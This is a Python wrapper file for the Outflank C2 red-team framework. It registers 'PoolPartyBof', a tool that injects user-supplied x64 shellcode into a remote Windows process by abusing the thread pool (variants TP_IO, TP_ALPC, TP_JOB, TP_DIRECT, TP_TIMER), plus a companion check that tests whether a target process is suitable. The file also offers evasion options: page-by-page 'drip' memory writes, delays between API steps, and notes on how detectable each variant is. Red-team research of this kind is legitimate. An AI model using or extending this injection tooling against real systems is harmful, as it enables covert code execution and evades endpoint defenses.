# PoolPartyBof — Outflank C2 (OC2 V2 / stage1) wrapper
# Author: Udayveer Singh (@an0nud4y)
#   https://github.com/An0nUD4Y
#   https://x.com/m4lici0u5
#
# OC2 2.x: copy this file and PoolPartyBof_V{4-8}.x64.o into shared/bofs.
# Shellcode comes from the command-form file field named "shellcode".
#
# OC2 3.x: do not use this wrapper for @artifacts/<name>. Stage1 V2 scripts
# never call ctx.fetch_artifact(). Install the oc2/ application instead
# (zip poolparty-bof/ with dist/*.o + oc2/, upload under Applications).

from typing import Dict, List, Optional, Tuple

from outflank_stage1.implant.enums import ImplantArch
from outflank_stage1.task.base_bof_task import BaseBOFTask
from outflank_stage1.task.enums import BOFArgumentEncoding, BOFType
from outflank_stage1.task.exceptions import TaskInvalidArgumentsException


class PoolPartyBOF(BaseBOFTask):
    VARIANTS = (4, 5, 6, 7, 8)

    def __init__(self):
        super().__init__(
            "PoolPartyBof",
            supported_architectures=[ImplantArch.INTEL_X64],
            bof_type=BOFType.DEFAULT,
        )
        self._variant = None

        self.parser.description = (
            "Thread-pool injection, variants 4-8. x64 implant and x64 target only."
        )
        self.parser.epilog = (
            "Queues work into an existing Windows thread pool in a remote x64 process.\n"
            "Injects only; does not sanity-check the PID. A 32-bit or layout-mismatched\n"
            "target can crash. Run poolparty-sanity first if unsure.\n"
            "On OC2 2.x upload the .bin with the command form (file field: shellcode).\n"
            "On OC2 3.x install the oc2/ application; type @ and pass @artifacts/<name>.\n"
            "This implant PID is refused by the BOF.\n"
            "Shellcode is allocated RW, written, then protected RX.\n"
            "--delay busy-waits between major API steps (not Sleep) and blocks the BOF\n"
            "until it returns. Cap 120 seconds per pause (enforced in the BOF).\n\n"
            "Variants\n"
            "  4  TP_IO     Temp file (delete-on-close) + overlapped write onto the pool IOCP.\n"
            "  5  TP_ALPC   Named ALPC port associated with the pool IOCP.\n"
            "  6  TP_JOB    Unnamed job; assigns this implant to the job.\n"
            "  7  TP_DIRECT ZwSetIoCompletion on the pool IOCP. Prefer this (fewest extra objects).\n"
            "  8  TP_TIMER  Worker factory + IRTimer. Replaces pool timer-queue roots, then restores.\n\n"
            "Example usage (OC2 2.x form upload):\n"
            "  PoolPartyBof 11868 7 --delay 2 --drip --drip-ms 50\n"
            "Example usage (OC2 3.x application, not this wrapper):\n"
            "  PoolPartyBof 11868 7 @artifacts/sc.bin --delay 2 --drip --drip-ms 50\n"
        )

        self.parser.add_argument(
            "pid",
            type=int,
            help="Target process ID (not this implant).",
        )
        self.parser.add_argument(
            "variant",
            type=int,
            choices=list(self.VARIANTS),
            help=(
                "Thread-pool variant: 4=TP_IO, 5=TP_ALPC, 6=TP_JOB, "
                "7=TP_DIRECT (prefer), 8=TP_TIMER."
            ),
        )
        self.parser.add_argument(
            "shellcode",
            nargs="?",
            default=None,
            help=(
                "Ignored on OC2 2.x (use the command-form file field). "
                "On OC2 3.x install the oc2/ application and pass @artifacts/<name>."
            ),
        )
        self.parser.add_argument(
            "--delay",
            type=int,
            default=0,
            help="Seconds between major API steps (default 0, BOF cap 120 per pause).",
        )
        self.parser.add_argument(
            "--drip",
            action="store_true",
            help="Reserve one region, then MEM_COMMIT and write one page at a time, then RX.",
        )
        self.parser.add_argument(
            "--drip-ms",
            type=int,
            default=0,
            dest="drip_ms",
            help="Milliseconds between drip pages (default 0, BOF cap 1000). Requires --drip.",
        )

    def validate_arguments(self, arguments: List[str]):
        super().validate_arguments(arguments)
        parser_arguments = self.parser.parse_args(arguments)

        if parser_arguments.pid <= 0:
            raise TaskInvalidArgumentsException("Please enter a valid PID.")
        if parser_arguments.delay < 0:
            raise TaskInvalidArgumentsException(
                "delay must be a non-negative integer."
            )
        if parser_arguments.drip_ms < 0:
            raise TaskInvalidArgumentsException(
                "drip-ms must be a non-negative integer."
            )
        if parser_arguments.drip_ms != 0 and not parser_arguments.drip:
            raise TaskInvalidArgumentsException("drip-ms requires --drip.")
        if parser_arguments.shellcode:
            raise TaskInvalidArgumentsException(
                "This V2 wrapper cannot fetch @artifacts/. Remove it from "
                "shared/bofs, install the oc2/ application (zip poolparty-bof/ "
                "with dist/*.o + oc2/), then run "
                "PoolPartyBof <pid> <variant> @artifacts/sc.bin ..."
            )

        self._variant = parser_arguments.variant

    @staticmethod
    def _file_content(file_obj) -> Optional[bytes]:
        if file_obj is None:
            return None
        for attr in ("content", "data"):
            value = getattr(file_obj, attr, None)
            if value:
                return value
        return None

    def _shellcode_bytes(self) -> bytes:
        # V2 only sees files attached to the task (command-form upload).
        # @artifacts/<name> is a V3 catalog token and is never downloaded here.
        try:
            content = self._file_content(self.get_file_by_name("shellcode"))
        except Exception as exc:
            raise TaskInvalidArgumentsException(f"Failed to read shellcode: {exc}") from exc
        if content:
            return content

        raise TaskInvalidArgumentsException(
            "No shellcode file attached. On OC2 2.x upload the .bin with the "
            "command form. On OC2 3.x install the oc2/ application and pass "
            "@artifacts/<name> (V2 wrappers cannot fetch catalog artifacts)."
        )

    def validate_files(self, arguments: List[str]):
        self._shellcode_bytes()

    def _resolve_variant(self) -> int:
        if self._variant in self.VARIANTS:
            return self._variant

        raw = None
        if hasattr(self, "get_arguments"):
            raw = self.get_arguments()
        if raw is not None:
            if isinstance(raw, str):
                arguments = self.split_arguments(raw)
            else:
                arguments = list(raw)
            parser_arguments = self.parser.parse_args(arguments)
            if parser_arguments.variant in self.VARIANTS:
                self._variant = parser_arguments.variant
                return parser_arguments.variant

        raise TaskInvalidArgumentsException("Variant must be 4-8.")

    def _get_base_binary_name(self) -> str:
        return f"PoolPartyBof_V{self._resolve_variant()}"

    def _encode_arguments_bof(
        self, arguments: List[str]
    ) -> List[Tuple[BOFArgumentEncoding, str]]:
        parser_arguments = self.parser.parse_args(arguments)
        drip = 1 if parser_arguments.drip else 0
        drip_ms = parser_arguments.drip_ms if parser_arguments.drip else 0

        return [
            (BOFArgumentEncoding.INT, parser_arguments.pid),
            (BOFArgumentEncoding.INT, parser_arguments.delay),
            (BOFArgumentEncoding.INT, drip),
            (BOFArgumentEncoding.INT, drip_ms),
            (BOFArgumentEncoding.BUFFER, self._shellcode_bytes()),
        ]

    def run(self, arguments: List[str]):
        parser_arguments = self.parser.parse_args(arguments)
        drip_note = " (drip)" if parser_arguments.drip else ""
        self.append_response(
            f"[*] Running PoolPartyBof variant {parser_arguments.variant} "
            f"against PID {parser_arguments.pid}{drip_note}\n\n"
        )
        super().run(arguments)

    def rewrite_response(self, response: Optional[str]) -> Optional[str]:
        return self.fix_newlines(response)

    def fix_newlines(self, response: Optional[str]) -> Optional[str]:
        if not response or response.startswith("Task started."):
            return response
        if response.startswith("[INFO]") or response.startswith("[-]"):
            return "\n" + response
        return "\n" + response

    @staticmethod
    def get_gui_elements() -> Optional[Dict]:
        return {
            "title": "Upload shellcode",
            "elements": [
                {
                    "name": "shellcode",
                    "type": "file",
                    "description": "x64 shellcode (raw .bin)",
                    "placeholder": "Select shellcode file",
                },
            ],
        }


class PoolPartySanityBOF(BaseBOFTask):
    VARIANTS = (4, 5, 6, 7, 8)

    def __init__(self):
        super().__init__(
            "poolparty-sanity",
            supported_architectures=[ImplantArch.INTEL_X64],
            bof_type=BOFType.DEFAULT,
        )
        self._variant = None
        self.parser.description = (
            "Query-only PoolParty suitability check. Does not inject."
        )
        self.parser.epilog = (
            "Does not inject. Opens the PID and checks that this variant can run:\n"
            "live x64 process (not WOW64), a Windows thread pool, V4-V7 pool IOCP,\n"
            "V8 IRTimer and timer-queue pointers, V4 writable temp, V5 ALPC port.\n"
            "Prints PASS or FAIL. No shellcode, no remote memory write.\n\n"
            "OPSEC: handle snapshot. V4 touches %TEMP%. V5 creates a short-lived named ALPC.\n"
            "Then inject with: PoolPartyBof <pid> <variant> and the shellcode file field.\n"
        )
        self.parser.add_argument(
            "pid",
            type=int,
            help="Target process ID (not this implant).",
        )
        self.parser.add_argument(
            "variant",
            type=int,
            choices=list(self.VARIANTS),
            help=(
                "Thread-pool variant: 4=TP_IO, 5=TP_ALPC, 6=TP_JOB, "
                "7=TP_DIRECT, 8=TP_TIMER."
            ),
        )

    def validate_arguments(self, arguments: List[str]):
        super().validate_arguments(arguments)
        parser_arguments = self.parser.parse_args(arguments)
        if parser_arguments.pid <= 0:
            raise TaskInvalidArgumentsException("Please enter a valid PID.")
        self._variant = parser_arguments.variant

    def validate_files(self, arguments: List[str]):
        return

    def _resolve_variant(self) -> int:
        if self._variant in self.VARIANTS:
            return self._variant
        raise TaskInvalidArgumentsException("Variant must be 4-8.")

    def _get_base_binary_name(self) -> str:
        return f"PoolPartyBof_V{self._resolve_variant()}"

    def _encode_arguments_bof(
        self, arguments: List[str]
    ) -> List[Tuple[BOFArgumentEncoding, str]]:
        parser_arguments = self.parser.parse_args(arguments)
        return [
            (BOFArgumentEncoding.INT, parser_arguments.pid),
        ]

    def run(self, arguments: List[str]):
        parser_arguments = self.parser.parse_args(arguments)
        self.append_response(
            f"[*] PoolParty sanity check variant {parser_arguments.variant} "
            f"against PID {parser_arguments.pid}\n\n"
        )
        super().run(arguments)

    def rewrite_response(self, response: Optional[str]) -> Optional[str]:
        return self.fix_newlines(response)

    def fix_newlines(self, response: Optional[str]) -> Optional[str]:
        if not response or response.startswith("Task started."):
            return response
        if (
            response.startswith("[INFO]")
            or response.startswith("[-]")
            or response.startswith("[+]")
        ):
            return "\n" + response
        return "\n" + response

